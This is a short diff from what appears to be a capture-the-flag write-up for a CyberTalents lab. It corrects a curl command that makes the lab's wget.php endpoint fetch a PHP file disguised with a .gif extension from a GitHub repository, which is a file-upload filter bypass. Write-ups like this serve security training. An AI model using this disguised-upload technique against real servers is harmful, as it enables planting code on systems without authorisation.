@@ -88,7 +88,7 @@ The filename needs to be constructed very precisely:
     POST Request to: /wget.php
     POST Data: url=https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif
 
-   - $ curl -X POST -d "url="https://github.com/mo7ammedAisha/f2up-challenge/Ax232.php.gif" cybertalent.com/wget.php 
+   - $ curl -X POST -d "url=https://github.com/mo7ammedAisha/f2up-challenge/blob/main/Ax232.php.gif" cybertalent.com/wget.php 
    
    Response:
    http://cdcamxwl32pue3e6m5p6v471txvg1g23gg7kkc834-web.cybertalentslabs.com/wget.php
